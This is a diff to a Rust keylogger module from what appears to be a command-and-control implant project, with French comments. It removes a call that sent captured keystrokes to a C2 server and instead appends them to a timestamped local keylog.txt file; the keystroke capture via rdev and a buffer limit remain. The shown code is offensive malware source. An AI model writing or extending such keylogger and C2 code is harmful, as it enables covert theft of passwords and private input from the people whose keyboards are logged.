@@ -1,10 +1,13 @@
-use crate::connexion::{send_directive_status, send_to_c2};
+use crate::connexion::send_directive_status;
 use anyhow::Result;
 use rdev::{Event, EventType, Key};
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Mutex};
 use std::thread;
 use tokio::time::{interval, Duration};
+use std::fs;
+use std::path::PathBuf;
+use chrono::Local;
 
 const MAX_BUFFER_SIZE: usize = 10_000;
 
@@ -67,11 +70,21 @@ impl KeyLogger {
             data
         };
 
-        println!("Envoi de {} caractères", data.len());
+        println!("Sauvegarde de {} caractères", data.len());
 
-        send_to_c2(data.into_bytes())
-            .await
-            .map_err(|e| anyhow::anyhow!("Erreur lors de l'envoi au C2: {}", e))?;
+        // Créer dossier output/127.0.0.1_TIMESTAMP/keylogger/
+        let output_dir = PathBuf::from("output");
+        let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S").to_string();
+        let session_dir = output_dir.join(format!("127.0.0.1_{}", timestamp)).join("keylogger");
+        fs::create_dir_all(&session_dir)?;
+        
+        // Ajouter les données au fichier keylog.txt
+        let logfile = session_dir.join("keylog.txt");
+        let mut content = fs::read_to_string(&logfile).unwrap_or_default();
+        content.push_str(&data);
+        fs::write(&logfile, content)?;
+        
+        println!("Données sauvegardées en: {:?}", logfile);
 
         Ok(())
     }
